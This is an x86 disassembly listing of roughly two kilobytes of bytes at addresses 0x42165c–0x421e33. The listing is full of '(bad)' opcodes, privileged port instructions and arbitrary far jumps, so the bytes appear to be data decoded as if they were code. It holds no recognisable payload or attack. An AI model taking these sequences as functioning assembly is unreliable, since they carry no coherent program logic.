  42165c:	int    0xfb
  42165e:	pop    edx
  42165f:	clc    
  421660:	jmp    0x42164f
  421662:	out    dx,eax
  421663:	ins    DWORD PTR es:[edi],dx
  421664:	lea    esp,[eax]
  421666:	fwait
  421667:	jmp    0xf31e:0x93d3eae2
  42166e:	or     DWORD PTR [eax],edx
  421670:	lahf   
  421671:	lods   eax,DWORD PTR ds:[esi]
  421672:	pop    eax
  421673:	enter  0x8613,0x39
  421677:	cmp    BYTE PTR [eax],0x2e
  42167a:	(bad)  
  42167b:	sub    BYTE PTR ss:[eax],dh
  42167e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42167f:	dec    eax
  421680:	xchg   ebp,eax
  421681:	adc    eax,0xf5af46a0
  421686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421687:	fs (bad) 
  421689:	push   ss
  42168a:	lock stos BYTE PTR es:[edi],al
  42168c:	sub    BYTE PTR [esi-0x519dd30b],bh
  421692:	jge    0x4216bb
  421694:	stos   DWORD PTR es:[edi],eax
  421695:	xchg   BYTE PTR [ecx-0xeaca554],dl
  42169b:	and    al,BYTE PTR [eax+0x5c51c42]
  4216a1:	jge    0x421625
  4216a3:	daa    
  4216a4:	out    0x24,al
  4216a6:	mov    esi,0xc5a98802
  4216ab:	lods   al,BYTE PTR ds:[esi]
  4216ac:	ror    ebp,0x87
  4216af:	dec    eax
  4216b0:	and    edi,DWORD PTR ds:0xa90e79f1
  4216b6:	shl    BYTE PTR [ecx-0x36],1
  4216b9:	adc    al,BYTE PTR [ebx+0x15]
  4216bc:	adc    dh,BYTE PTR [ebp+0x13eaf7b4]
  4216c2:	(bad)  
  4216c3:	repz or al,0xa4
  4216c6:	dec    ebx
  4216c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216c8:	sbb    al,0x6e
  4216ca:	jae    0x4216d7
  4216cc:	scas   al,BYTE PTR es:[edi]
  4216cd:	and    bl,BYTE PTR [esi+0x63]
  4216d0:	cmp    BYTE PTR [ebp-0x26d9f7d6],dl
  4216d6:	jmp    0x8a5a:0xc108d0d9
  4216dd:	push   ebp
  4216de:	cld    
  4216df:	or     BYTE PTR [eax],bl
  4216e1:	cmp    al,BYTE PTR [edi-0x5324bf7c]
  4216e7:	(bad)  
  4216e8:	mov    edi,0xccbbe6c5
  4216ed:	lock cdq 
  4216ef:	lahf   
  4216f0:	icebp  
  4216f1:	outs   dx,BYTE PTR ds:[esi]
  4216f2:	mov    cs,WORD PTR [esi+0x32]
  4216f5:	test   al,0xbb
  4216f7:	lds    esp,FWORD PTR [ebp-0x49]
  4216fa:	stos   BYTE PTR es:[edi],al
  4216fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216fc:	mov    WORD PTR [edi+eiz*1],es
  4216ff:	inc    ecx
  421700:	push   eax
  421701:	iret   
  421702:	mov    cl,0x6e
  421704:	adc    BYTE PTR [eax+0x4d],0x3e
  421708:	jno    0x4216d9
  42170a:	xlat   BYTE PTR ds:[ebx]
  42170b:	outs   dx,BYTE PTR ds:[esi]
  42170c:	int3   
  42170d:	test   BYTE PTR [edi+0x4b61e0d1],bl
  421713:	push   0xd4bd7ed9
  421718:	add    eax,0x567ddc2b
  42171d:	sub    ebp,DWORD PTR [ebx+0x2e87d72d]
  421723:	iret   
  421724:	test   BYTE PTR [ebp+0x2f],ch
  421727:	mov    ds:0xe0026c1e,eax
  42172c:	xchg   BYTE PTR [edx+ebp*2-0x65],bh
  421730:	int    0x9f
  421732:	fidiv  DWORD PTR [edx]
  421734:	cmp    ebx,DWORD PTR [edx-0x75a0f7fd]
  42173a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42173b:	xor    dh,BYTE PTR [ebp+0xf]
  42173e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42173f:	mov    dh,0xe4
  421741:	hlt    
  421742:	cmp    ebx,DWORD PTR ss:[esp+ecx*2-0x1b]
  421747:	xor    eax,0xf9912d69
  42174c:	mov    esp,esp
  42174e:	and    BYTE PTR [ecx-0x5ab76e71],al
  421754:	add    edx,DWORD PTR [ebx]
  421756:	pop    esp
  421757:	mov    edi,0x8c53f7b5
  42175c:	or     eax,0xe0ba71e6
  421761:	mov    esi,edx
  421763:	mov    bh,0xce
  421765:	cmp    DWORD PTR [eax+ecx*4-0x68],ecx
  421769:	mov    al,ds:0xfd065d60
  42176e:	adc    esi,DWORD PTR [eax]
  421770:	adc    BYTE PTR [esi+0x2a4380f5],0x35
  421777:	dec    eax
  421778:	dec    edi
  421779:	pop    ss
  42177a:	sti    
  42177b:	in     al,0xbd
  42177d:	pop    es
  42177e:	call   0x7c32:0x138f7cc8
  421785:	xchg   esi,eax
  421786:	rol    DWORD PTR [edx],cl
  421788:	cdq    
  421789:	xchg   edi,edx
  42178b:	(bad)  
  42178c:	and    bh,BYTE PTR [edx+0x12d84f5a]
  421792:	xchg   esp,eax
  421793:	mov    esp,0x5f6b2c63
  421798:	dec    DWORD PTR [esi+esi*8-0x10]
  42179c:	jae    0x42172c
  42179e:	xchg   edi,eax
  42179f:	xlat   BYTE PTR ds:[ebx]
  4217a0:	jmp    0x1fba:0xc58e9147
  4217a7:	inc    eax
  4217a8:	add    DWORD PTR [edx+ecx*4],edx
  4217ab:	pop    edi
  4217ac:	hlt    
  4217ad:	push   ds
  4217ae:	sub    ebp,DWORD PTR [ecx]
  4217b0:	sti    
  4217b1:	in     al,0xc7
  4217b3:	or     al,0x46
  4217b5:	sbb    eax,0x6704aca0
  4217ba:	jl     0x4217a8
  4217bc:	mul    BYTE PTR [ebx]
  4217be:	fist   DWORD PTR [ecx+eax*4+0x642fc554]
  4217c5:	adc    BYTE PTR [edx+0x626a4f92],0x1d
  4217cc:	loop   0x421790
  4217ce:	pop    ebx
  4217cf:	sahf   
  4217d0:	fisub  WORD PTR [esi+ecx*1+0x5f]
  4217d4:	jnp    0x4217a9
  4217d6:	add    cl,al
  4217d8:	mov    cl,0x49
  4217da:	push   edx
  4217db:	adc    eax,0x6007c9ee
  4217e0:	add    dl,BYTE PTR [eax+0x50fdcd72]
  4217e6:	leave  
  4217e7:	test   DWORD PTR [ebx+0x270276d4],edx
  4217ed:	pop    ss
  4217ee:	in     eax,0x2f
  4217f0:	fld    TBYTE PTR [ebx+0x46]
  4217f3:	imul   ebp,DWORD PTR [eax+edi*4-0x72],0x51
  4217f8:	dec    eax
  4217f9:	rcr    BYTE PTR [esi-0x62],1
  4217fc:	cli    
  4217fd:	les    ebx,FWORD PTR [edi]
  4217ff:	aas    
  421800:	add    DWORD PTR [ebx+eiz*2+0xf7e56d],0x1a
  421808:	nop
  421809:	jae    0x421860
  42180b:	dec    ebp
  42180c:	mov    ebp,0x261ecd84
  421811:	cmp    eax,0xb6982237
  421816:	xor    bl,BYTE PTR [edi+eax*1]
  421819:	pop    edx
  42181a:	je     0x421888
  42181c:	xor    ebx,DWORD PTR [edx]
  42181e:	test   eax,0xa1562f28
  421823:	in     eax,dx
  421824:	cs (bad) 
  421826:	je     0x421833
  421828:	jns    0x421887
  42182a:	xchg   esp,eax
  42182b:	pop    ebx
  42182c:	scas   eax,DWORD PTR es:[edi]
  42182d:	lds    eax,FWORD PTR [eax]
  42182f:	adc    eax,0x7fd60e68
  421834:	neg    ch
  421836:	jmp    0x4217ef
  421838:	popa   
  421839:	test   eax,0x7322b8b1
  42183e:	mov    edi,0x193f6
  421843:	out    0x1,eax
  421845:	add    BYTE PTR [eax],al
  421847:	xor    al,0x2d
  421849:	push   ss
  42184a:	test   eax,0x35b8af10
  42184f:	test   bh,bh
  421851:	mov    eax,ds:0x1005cf72
  421856:	outs   dx,BYTE PTR ds:[esi]
  421857:	mov    esi,0x62c661b5
  42185c:	xchg   DWORD PTR [edi+ecx*8+0x37],eax
  421860:	mov    eax,ds:0x1288ad6b
  421865:	dec    ecx
  421866:	and    DWORD PTR [ecx-0x51b08359],esi
  42186c:	bound  esi,QWORD PTR [esi+eiz*1+0x79]
  421870:	jecxz  0x421828
  421872:	add    BYTE PTR [eax],ch
  421874:	sub    dh,BYTE PTR [ebp+edx*8-0x7c11f28c]
  42187b:	jo     0x4218ab
  42187d:	inc    edx
  42187e:	test   DWORD PTR [ecx-0x6b19085d],eax
  421884:	mov    eax,ds:0x68dfc89d
  421889:	jae    0x421812
  42188b:	inc    ebp
  42188c:	dec    esp
  42188d:	sahf   
  42188e:	add    ah,BYTE PTR ds:0xb2729ec3
  421894:	mov    dh,0xfe
  421896:	xor    ah,dh
  421898:	add    al,BYTE PTR [ecx]
  42189a:	inc    ebx
  42189b:	inc    DWORD PTR [edx-0xf]
  42189e:	enter  0xce8a,0xc6
  4218a2:	ja     0x4218db
  4218a4:	mov    al,ds:0x51f73579
  4218a9:	xchg   esp,eax
  4218aa:	inc    edx
  4218ab:	aad    0x51
  4218ad:	lods   eax,DWORD PTR ds:[esi]
  4218ae:	jle    0x42191d
  4218b0:	retf   0xbd1b
  4218b3:	push   edi
  4218b4:	int3   
  4218b5:	aam    0xea
  4218b7:	test   BYTE PTR [edx],0x2e
  4218ba:	cdq    
  4218bb:	xchg   ebx,eax
  4218bc:	gs out 0xed,eax
  4218bf:	fisttp DWORD PTR [ebx+0x7]
  4218c2:	or     esi,edx
  4218c4:	add    ebp,edx
  4218c6:	mov    dl,0x26
  4218c8:	(bad)  
  4218c9:	push   eax
  4218ca:	in     eax,dx
  4218cb:	push   eax
  4218cc:	rcl    esp,0xb9
  4218cf:	js     0x421932
  4218d1:	loopne 0x421869
  4218d3:	push   ebp
  4218d4:	fistp  QWORD PTR [ebx]
  4218d6:	push   edi
  4218d7:	inc    esi
  4218d8:	(bad)
  4218db:	pop    esp
  4218dc:	paddq  mm6,QWORD PTR ss:[ecx]
  4218e0:	loopne 0x421875
  4218e2:	pop    DWORD PTR [ecx-0x51d146ba]
  4218e8:	xchg   edx,eax
  4218e9:	stos   BYTE PTR es:[edi],al
  4218ea:	pop    ecx
  4218eb:	mov    ecx,0x90d2a0c5
  4218f0:	(bad)  
  4218f1:	xchg   esi,eax
  4218f2:	ds (bad) 
  4218f4:	push   ecx
  4218f5:	mov    BYTE PTR [esi],dh
  4218f7:	or     bl,BYTE PTR [esp+edx*4+0x21]
  4218fb:	xchg   esp,eax
  4218fc:	jmp    0xcd6d6146
  421901:	je     0x4218d8
  421903:	adc    eax,0x5067126c
  421908:	mov    eax,DWORD PTR [ebx]
  42190a:	mov    eax,ebx
  42190c:	inc    BYTE PTR [edx+0x1492faaa]
  421912:	pop    ss
  421913:	and    eax,0x1bf637c8
  421918:	push   eax
  421919:	xchg   edx,eax
  42191a:	lods   al,BYTE PTR ds:[esi]
  42191b:	mov    dh,0x40
  42191d:	fist   WORD PTR [ebp+esi*8-0x9]
  421921:	pushf  
  421922:	sbb    BYTE PTR [esi+0x4ef9f05b],0xda
  421929:	adc    eax,0x2d21019e
  42192e:	push   es
  42192f:	or     bl,BYTE PTR cs:[ebp+0x79a60c34]
  421936:	sbb    DWORD PTR [edi-0x2476d71],edi
  42193c:	cmp    bh,bh
  42193e:	shl    cl,0xa4
  421941:	mov    eax,ds:0xccd503d2
  421946:	and    cl,BYTE PTR [ecx-0x5f29d0e7]
  42194c:	adc    ecx,DWORD PTR [edx-0x390a42d1]
  421952:	inc    esi
  421953:	test   BYTE PTR [ebp+0x7618573e],ch
  421959:	jne    0x42194f
  42195b:	xchg   edi,eax
  42195c:	push   ecx
  42195d:	push   edi
  42195e:	call   0x2cefc821
  421963:	inc    edi
  421964:	jns    0x421932
  421966:	jns    0x42195c
  421968:	mov    eax,0x9896e86a
  42196d:	fldcw  WORD PTR [eax]
  42196f:	sbb    eax,0x534e7649
  421974:	xchg   edx,edi
  421976:	fldcw  WORD PTR ds:0x8db55913
  42197c:	jge    0x421954
  42197e:	ret    
  42197f:	idiv   DWORD PTR [ebx]
  421981:	push   ecx
  421982:	mov    ebp,0xee1f0d9a
  421987:	popa   
  421988:	cmp    BYTE PTR [ecx-0x3d64101e],al
  42198e:	sar    BYTE PTR [esi-0x3b],cl
  421991:	retf   0x37f8
  421994:	xchg   ecx,eax
  421995:	push   cs
  421996:	(bad)  
  421997:	fdivr  DWORD PTR [ecx-0x65]
  42199a:	add    eax,0xf169fb94
  42199f:	call   0x14a9:0xf497f9d2
  4219a6:	shr    BYTE PTR [edx-0x5b8e50e2],cl
  4219ac:	scas   al,BYTE PTR es:[edi]
  4219ad:	clc    
  4219ae:	jp     0x421a0f
  4219b0:	cld    
  4219b1:	das    
  4219b2:	cmp    DWORD PTR [eax+0x6],0xc
  4219b6:	pop    ebp
  4219b7:	jnp    0x421971
  4219b9:	push   es
  4219ba:	sub    al,0x74
  4219bc:	out    dx,eax
  4219bd:	je     0x42199b
  4219bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219c0:	(bad)  
  4219c1:	daa    
  4219c2:	pop    esi
  4219c3:	add    ah,cl
  4219c5:	xchg   ecx,eax
  4219c6:	pop    edi
  4219c7:	mov    ecx,0x60725ea0
  4219cc:	bound  esp,QWORD PTR [esi+0x2d]
  4219cf:	icebp  
  4219d0:	popf   
  4219d1:	imul   ebp,DWORD PTR [esi-0x2b],0xc2c4f22b
  4219d8:	cli    
  4219d9:	inc    ebx
  4219da:	push   edi
  4219db:	ja     0x421a4e
  4219dd:	into   
  4219de:	(bad)  
  4219df:	xor    dl,BYTE PTR ds:0xdde2b6b1
  4219e5:	dec    esp
  4219e6:	daa    
  4219e7:	sub    BYTE PTR [ebp-0x3a],cl
  4219ea:	fdiv   QWORD PTR [ebp-0x49]
  4219ed:	in     al,0xdb
  4219ef:	nop
  4219f0:	pop    ds
  4219f1:	cld    
  4219f2:	jle    0x421a4b
  4219f4:	imul   ebp,DWORD PTR [esi-0x7de48fda],0xffffffd9
  4219fb:	stos   BYTE PTR es:[edi],al
  4219fc:	push   ecx
  4219fd:	out    dx,al
  4219fe:	clc    
  4219ff:	sbb    eax,0x4a52db70
  421a04:	enter  0x4bb9,0xa5
  421a08:	cmp    al,0x4e
  421a0a:	cmp    DWORD PTR [ebx+0x163c00bc],ebp
  421a10:	out    dx,al
  421a11:	loopne 0x421a78
  421a13:	bnd je 0x421998
  421a16:	add    ebp,DWORD PTR [ebp+0x43]
  421a19:	push   cs
  421a1a:	call   0xb577:0x4d9ad5e6
  421a21:	lea    esp,[ebx+0x64]
  421a24:	cmp    ah,BYTE PTR [ebx-0x5349d3ff]
  421a2a:	lea    eax,[edx-0x1a]
  421a2d:	xor    al,0x0
  421a2f:	cld    
  421a30:	mov    WORD PTR [ebx+edx*8-0x5000040c],?
  421a37:	mov    cl,0x8b
  421a39:	repnz das 
  421a3b:	mov    eax,0xdd2c61de
  421a40:	xchg   ebp,eax
  421a41:	add    DWORD PTR [eax],eax
  421a43:	out    0x1,eax
  421a45:	add    BYTE PTR [eax],al
  421a47:	lahf   
  421a48:	sub    al,0x6e
  421a4a:	adc    al,0xba
  421a4c:	add    dh,BYTE PTR [ecx+esi*8+0x43]
  421a50:	aas    
  421a51:	fldcw  WORD PTR [edx+0x5087927e]
  421a57:	aad    0x40
  421a59:	mov    dl,0xd1
  421a5b:	test   eax,0x85be528c
  421a60:	mov    bl,0x28
  421a62:	sbb    al,0x4f
  421a64:	fs add ebp,eax
  421a67:	test   al,0x5e
  421a69:	jl     0x421ad7
  421a6b:	fnstenv [ecx]
  421a6d:	cmp    bl,dh
  421a6f:	ret    
  421a70:	imul   esp,DWORD PTR [ebx+0x6afce560],0x19
  421a77:	sti    
  421a78:	jmp    0x159fa281
  421a7d:	cmp    eax,0xeba2de0c
  421a82:	push   esp
  421a83:	sbb    bl,bh
  421a85:	push   edi
  421a86:	adc    DWORD PTR [edi+0x3f],edi
  421a89:	xor    DWORD PTR ds:0x291c4a5c,esi
  421a8f:	cmp    cl,BYTE PTR [ebx+0x11]
  421a92:	das    
  421a93:	jno    0x421aa5
  421a95:	aad    0x7b
  421a97:	ss push es
  421a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a9a:	pop    esp
  421a9b:	fwait
  421a9c:	push   0x4ea15469
  421aa1:	stc    
  421aa2:	gs mov dl,0x82
  421aa5:	mov    BYTE PTR [ebp+0x47],0x3e
  421aa9:	fstp   TBYTE PTR [edx]
  421aab:	xor    BYTE PTR ds:0x9fda3b1e,dh
  421ab1:	xchg   edx,eax
  421ab2:	mov    BYTE PTR [esi+0x4f],bl
  421ab5:	bnd ret 
  421ab7:	hlt    
  421ab8:	adc    eax,0xea9ac71f
  421abd:	pop    ebx
  421abe:	in     eax,0xbd
  421ac0:	xchg   edx,eax
  421ac1:	sub    esi,edi
  421ac3:	inc    esi
  421ac4:	rcl    DWORD PTR [ecx],cl
  421ac6:	in     eax,0x39
  421ac8:	cmp    DWORD PTR [edx+0x984424a],eax
  421ace:	ds sbb eax,0xa04b5a32
  421ad4:	push   0x2e
  421ad6:	pop    ecx
  421ad7:	cld    
  421ad8:	ds xor al,0xe5
  421adb:	daa    
  421adc:	pusha  
  421add:	mov    edx,0x945160a8
  421ae2:	stos   BYTE PTR es:[edi],al
  421ae3:	scas   eax,DWORD PTR es:[edi]
  421ae4:	inc    eax
  421ae5:	sar    esi,0x1
  421ae8:	stc    
  421ae9:	(bad)  
  421aea:	mov    edi,0x6fa068bf
  421aef:	xor    eax,DWORD PTR [ebx+0x646b7668]
  421af5:	cmp    BYTE PTR [ebp-0x745949dc],bh
  421afb:	mov    DWORD PTR [ebx],ebp
  421afd:	ret    0x260e
  421b00:	outs   dx,DWORD PTR ds:[esi]
  421b01:	push   cs
  421b02:	imul   ecx,DWORD PTR [edx],0x5b
  421b05:	push   ebx
  421b06:	ds xor al,0x2d
  421b09:	sahf   
  421b0a:	mov    ecx,0x7c6ab4
  421b0f:	xchg   cl,al
  421b11:	xchg   ecx,eax
  421b12:	enter  0xd805,0xb9
  421b16:	fcomp  QWORD PTR [ecx+0x1b5146]
  421b1c:	lea    edi,ds:0xc3133684
  421b22:	mov    ebp,0xe1460f60
  421b27:	mov    dl,dl
  421b29:	jmp    0x8b70:0xf24ff478
  421b30:	into   
  421b31:	out    dx,eax
  421b32:	xor    DWORD PTR [ecx-0x1b],eax
  421b35:	inc    edx
  421b36:	pop    ds
  421b37:	daa    
  421b38:	xchg   edx,eax
  421b39:	pop    edx
  421b3a:	addr16 popf 
  421b3c:	cmp    al,0x2c
  421b3e:	stos   BYTE PTR es:[edi],al
  421b3f:	mov    eax,ebp
  421b41:	dec    esi
  421b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b43:	inc    eax
  421b44:	inc    ebx
  421b45:	adc    dh,BYTE PTR [ebp-0x7dba2935]
  421b4b:	cwde   
  421b4c:	cmp    eax,0x8dc33f6c
  421b51:	push   0x68
  421b53:	std    
  421b54:	outs   dx,DWORD PTR ds:[esi]
  421b55:	stos   DWORD PTR es:[edi],eax
  421b56:	sbb    DWORD PTR [edi],0x66a560d7
  421b5c:	ja     0x421af1
  421b5e:	sbb    ch,BYTE PTR [esi*4-0x3f0c16eb]
  421b65:	push   0x13840299
  421b6a:	or     BYTE PTR [ebp+0x1],dh
  421b6d:	mov    ah,0xd9
  421b6f:	test   BYTE PTR [ecx-0x4333c1f1],cl
  421b75:	mov    bh,0xf
  421b77:	jle    0x421bcd
  421b79:	jg     0x421bad
  421b7b:	out    dx,eax
  421b7c:	(bad)  
  421b7d:	sub    dl,dl
  421b7f:	(bad)  [ebx+0x67]
  421b82:	jns    0x421bd0
  421b84:	or     DWORD PTR [eax-0x5447b245],esi
  421b8a:	sbb    DWORD PTR [ebx-0x14afbb6a],edx
  421b90:	or     eax,0x188c8f5f
  421b95:	xchg   edx,eax
  421b96:	sbb    cl,dh
  421b98:	sbb    eax,0x3026487e
  421b9e:	aad    0x78
  421ba0:	sbb    al,0x34
  421ba2:	mov    ebx,0x525ba27f
  421ba7:	jns    0x421c01
  421ba9:	cli    
  421baa:	je     0x421c0f
  421bac:	add    eax,0xe880d7c
  421bb1:	in     al,0xe4
  421bb3:	sahf   
  421bb4:	out    dx,al
  421bb5:	fiadd  WORD PTR [esp+edi*4]
  421bb8:	pop    ds
  421bb9:	in     eax,0x7a
  421bbb:	imul   edx,edi,0x81ad5937
  421bc1:	push   es
  421bc2:	jo     0x421bd3
  421bc4:	hlt    
  421bc5:	and    esi,esp
  421bc7:	pop    edx
  421bc8:	cmp    BYTE PTR [ecx],dh
  421bca:	sti    
  421bcb:	and    ch,ch
  421bcd:	jg     0x421baa
  421bcf:	jbe    0x421b61
  421bd1:	jne    0x421bcc
  421bd3:	dec    ebp
  421bd4:	mov    edx,0x74612e1f
  421bd9:	jno    0x421bad
  421bdb:	arpl   WORD PTR ds:[eiz*4+0x143cbeee],bx
  421be3:	stos   BYTE PTR es:[edi],al
  421be4:	mov    ebp,0x1493a346
  421be9:	cld    
  421bea:	dec    ebp
  421beb:	ins    DWORD PTR es:[edi],dx
  421bec:	mov    eax,ds:0x52e34ad7
  421bf1:	sub    eax,0xf6514aec
  421bf6:	mov    cl,0x55
  421bf8:	ja     0x421bf6
  421bfa:	retf   0xa737
  421bfd:	retf   0xf4e4
  421c00:	xchg   ebp,eax
  421c01:	mov    al,ds:0x75bba496
  421c06:	inc    edx
  421c07:	inc    ebx
  421c08:	or     ecx,esp
  421c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c0b:	jmp    0x421b9c
  421c0d:	xor    ebp,DWORD PTR [ebp+0x67]
  421c10:	nop
  421c11:	sti    
  421c12:	loopne 0x421bbe
  421c14:	dec    ebx
  421c15:	cmp    cl,BYTE PTR [edx-0x59]
  421c18:	jno    0x421c6c
  421c1a:	inc    eax
  421c1b:	test   DWORD PTR [ebx-0x720f337a],0x49b787a8
  421c25:	xlat   BYTE PTR ds:[ebx]
  421c26:	fwait
  421c27:	dec    edi
  421c28:	jb     0x421c13
  421c2a:	ficom  DWORD PTR [eax-0x10]
  421c2d:	icebp  
  421c2e:	add    bl,cl
  421c30:	test   al,0x91
  421c32:	sbb    eax,0xfecf3df3
  421c37:	push   esp
  421c38:	jne    0x421ca1
  421c3a:	loop   0x421c34
  421c3c:	bound  ecx,QWORD PTR [eax]
  421c3e:	xchg   esp,eax
  421c3f:	les    edx,FWORD PTR [edi+0x1e70001]
  421c45:	add    BYTE PTR [eax],al
  421c47:	mov    ah,dl
  421c49:	adc    eax,0xdc5af085
  421c4e:	push   ds
  421c4f:	imul   edi,DWORD PTR [ebp+0x26],0x15
  421c53:	push   ebx
  421c54:	pop    edi
  421c55:	sbb    DWORD PTR [ebx+0x5673ca22],0x24
  421c5c:	fcmovu st,st(7)
  421c5e:	aam    0x64
  421c60:	int3   
  421c61:	idiv   DWORD PTR [edi+0x3d]
  421c64:	mov    ah,0x7c
  421c66:	and    DWORD PTR [edi-0x23f42f9e],edx
  421c6c:	adc    eax,0xe0bf89d1
  421c71:	mov    bl,0x17
  421c73:	jmp    0x402b:0x4be6c850
  421c7a:	loopne 0x421c4c
  421c7c:	sub    BYTE PTR [ecx],bl
  421c7e:	shl    BYTE PTR [ebp-0xfa7a1df],cl
  421c84:	ficomp DWORD PTR [ebp+eiz*1-0x7b]
  421c88:	inc    ebp
  421c89:	fdiv   DWORD PTR [eax+0x6d]
  421c8c:	dec    edx
  421c8d:	outs   dx,DWORD PTR ds:[esi]
  421c8e:	xchg   ebp,eax
  421c8f:	(bad)  
  421c90:	mov    edx,0x95daba43
  421c95:	das    
  421c96:	mov    ds:0xec52bb04,al
  421c9b:	push   edi
  421c9c:	sbb    ecx,esi
  421c9e:	mov    bl,0xef
  421ca0:	push   ebp
  421ca1:	(bad)  [eax+eiz*1-0x5]
  421ca5:	mov    cl,0xc8
  421ca7:	mov    DWORD PTR [ecx+esi*2],edx
  421caa:	cmp    al,0x1b
  421cac:	cmp    BYTE PTR [ebx+esi*4],ch
  421caf:	adc    BYTE PTR [eax-0x5f],al
  421cb2:	pop    ebx
  421cb3:	rep lods eax,DWORD PTR ds:[esi]
  421cb5:	xor    al,0x5a
  421cb7:	xchg   esi,eax
  421cb8:	jmp    0x9a1aaebc
  421cbd:	pop    edi
  421cbe:	jmp    0xcfd380b9
  421cc3:	pop    esi
  421cc4:	add    BYTE PTR [ecx],0x49
  421cc7:	cmp    eax,0xee00eb34
  421ccc:	jg     0x421d1e
  421cce:	push   esp
  421ccf:	js     0x421cea
  421cd1:	push   edi
  421cd2:	outs   dx,BYTE PTR ds:[esi]
  421cd3:	fs pop edi
  421cd5:	jnp    0x421d47
  421cd7:	aaa    
  421cd8:	xlat   BYTE PTR ds:[ebx]
  421cd9:	mov    edi,0xf429ad6e
  421cde:	sbb    esi,DWORD PTR [ebx]
  421ce0:	popa   
  421ce1:	sub    al,0xd4
  421ce3:	(bad)  
  421ce5:	pop    ebp
  421ce6:	sbb    eax,0x807acc08
  421ceb:	inc    esp
  421cec:	(bad)  
  421ced:	mov    al,0xee
  421cef:	(bad)  
  421cf1:	sbb    al,0x6e
  421cf3:	lahf   
  421cf4:	mov    ds:0x9c1e02f,eax
  421cf9:	mov    esp,0xb5d93020
  421cfe:	sti    
  421cff:	popf   
  421d00:	push   cs
  421d01:	mov    esi,0x7ef7b5d4
  421d06:	or     al,0x1e
  421d08:	sbb    DWORD PTR [edx],0xffffffe4
  421d0b:	sub    bl,BYTE PTR [esi-0x27]
  421d0e:	(bad)  
  421d0f:	sahf   
  421d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d11:	jnp    0x421d84
  421d13:	jns    0x421d55
  421d15:	inc    esi
  421d16:	outs   dx,DWORD PTR ds:[esi]
  421d17:	retf   
  421d18:	call   0x1ffc31d
  421d1d:	test   BYTE PTR [ebx],dh
  421d1f:	jmp    0x942d:0xd4b79ca6
  421d26:	lds    esi,FWORD PTR [edi-0x18]
  421d29:	fistp  WORD PTR [edi-0xa]
  421d2c:	or     eax,0x4559ce9d
  421d31:	adc    edx,ebp
  421d33:	retf   0x35db
  421d36:	mov    dl,0x94
  421d38:	stc    
  421d39:	jb     0x421cec
  421d3b:	ds scas al,BYTE PTR es:[edi]
  421d3d:	push   ecx
  421d3e:	lock sar ah,1
  421d41:	fimul  WORD PTR [eax]
  421d43:	es fmul st(0),st
  421d46:	pop    ecx
  421d47:	inc    esp
  421d48:	cs push esi
  421d4a:	out    0x5a,eax
  421d4c:	loop   0x421cfe
  421d4e:	pop    ebp
  421d4f:	out    0x4c,eax
  421d51:	push   ecx
  421d52:	fs jecxz 0x421d61
  421d55:	mov    WORD PTR [esi-0x13],cs
  421d58:	es cwde 
  421d5a:	arpl   WORD PTR [edx+0x70b199aa],sp
  421d60:	(bad)  
  421d61:	xchg   ebp,eax
  421d62:	xchg   ecx,eax
  421d63:	jl     0x46850faa
  421d69:	jne    0x421d8c
  421d6b:	rcr    ecx,0x71
  421d6e:	xchg   esp,eax
  421d6f:	inc    esp
  421d70:	fild   WORD PTR [ebx-0x32c135dc]
  421d76:	pop    ss
  421d77:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  421d79:	sbb    BYTE PTR fs:[ebp-0x2ec326b5],ch
  421d80:	inc    edx
  421d81:	sbb    DWORD PTR [ebp+0x44],0x1256c055
  421d88:	and    eax,0xf132c2e
  421d8d:	jecxz  0x421d6a
  421d8f:	inc    ebp
  421d91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d92:	int    0x83
  421d94:	xchg   ebx,eax
  421d95:	out    0x85,eax
  421d97:	xor    BYTE PTR [ebx-0x49aeb7d2],0x8b
  421d9e:	sbb    al,0xee
  421da0:	and    esp,DWORD PTR ds:0x5a3ab203
  421da6:	lods   eax,DWORD PTR ds:[esi]
  421da7:	push   0xffffffee
  421da9:	test   BYTE PTR [edx+0x5dfb0f14],ch
  421daf:	in     al,0xcf
  421db1:	mov    WORD PTR [eax-0x6a],ss
  421db4:	push   es
  421db5:	push   ecx
  421db6:	xor    ebp,DWORD PTR [esi+ebp*1]
  421db9:	loop   0x421d6a
  421dbb:	rol    DWORD PTR [ecx-0x579fc571],cl
  421dc1:	pop    ds
  421dc2:	sub    cl,BYTE PTR [ebx]
  421dc4:	gs xchg edi,eax
  421dc6:	cdq    
  421dc7:	sub    BYTE PTR [ebx+0x78599508],dh
  421dcd:	loopne 0x421d60
  421dcf:	pushf  
  421dd0:	xchg   esp,eax
  421dd1:	sub    esp,DWORD PTR [ecx-0x19]
  421dd4:	xchg   esi,eax
  421dd5:	test   DWORD PTR [esp+edi*2-0xbc5e768],0x151b9fc8
  421de0:	int    0x9b
  421de2:	jle    0x421e4c
  421de4:	mov    dh,0x98
  421de6:	and    eax,0x471875b5
  421deb:	mov    al,ds:0xc9b19a12
  421df0:	loop   0x421dd2
  421df2:	popa   
  421df3:	pop    ecx
  421df4:	mov    edx,0x3a5e59d6
  421df9:	sbb    ebx,0x26
  421dfc:	stc    
  421dfd:	(bad)  
  421dfe:	push   ebx
  421dff:	sub    al,cl
  421e01:	sub    ch,bh
  421e03:	mov    edx,0x6ca1c6a9
  421e08:	push   0xd83cd97f
  421e0d:	jnp    0x421e6b
  421e0f:	jo     0x421e63
  421e11:	pop    es
  421e12:	dec    edi
  421e13:	mov    bh,0x91
  421e15:	sub    DWORD PTR [ebp-0x4575f1fb],esi
  421e1b:	xor    ebp,ebp
  421e1d:	shl    DWORD PTR [edx-0x12],cl
  421e20:	pop    eax
  421e21:	pop    ecx
  421e22:	pop    ds
  421e23:	(bad)  
  421e24:	retf   0xd8f5
  421e27:	sbb    eax,0x13125c42
  421e2c:	xor    eax,0x4fb400f5
  421e31:	sbb    al,0x53
  421e33:	call   DWORD PTR [ebx-0x1]
